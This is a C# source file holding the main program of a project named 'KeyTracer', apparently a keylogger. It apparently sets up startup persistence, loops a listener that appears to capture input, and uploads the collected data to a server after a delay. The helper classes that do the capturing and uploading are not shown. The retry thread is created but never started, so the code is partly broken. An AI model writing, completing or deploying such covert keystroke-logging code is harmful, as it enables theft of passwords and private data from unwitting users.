using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;

namespace KeyTracer
{
    class Program
    {
        static bool connected = false;

        static void Main(string[] args)
        {
            StartUp.Configure();

            if (Internet.Connect() == 1)
                connected = true;

            if (connected)
            {
                Thread work = new Thread(new ThreadStart(DoWork));
                work.Start();
            }
            else
            {
                Thread retry = new Thread(new ThreadStart(Reconnect));
            }

            while (true)
            {
                Listener.Listen();
            }
        }

        private static void DoWork()
        {
            if (connected)
            {
                Thread.Sleep(Consts.uploadDelay);
                Server.Upload();
            }
        }

        private static void Reconnect()
        {
            if (!connected)
            {
                Thread.Sleep(Consts.serverTimeout);
                Internet.Connect();
            }
        }
    }
}
